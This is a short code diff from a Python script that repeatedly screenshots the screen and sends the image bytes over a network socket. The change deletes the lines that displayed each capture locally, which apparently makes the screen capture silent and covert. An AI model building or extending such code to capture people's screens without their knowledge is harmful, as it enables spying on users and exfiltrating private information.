@@ -14,8 +14,6 @@ while True:
     a = pyautogui.screenshot()
     bt = io.BytesIO()
     a.save(bt, format="JPEG")
-    bs = io.BytesIO(bt.getvalue())
-    g = Image.open(bs).show()
     s.send(bt.getvalue())
     s.close()
 
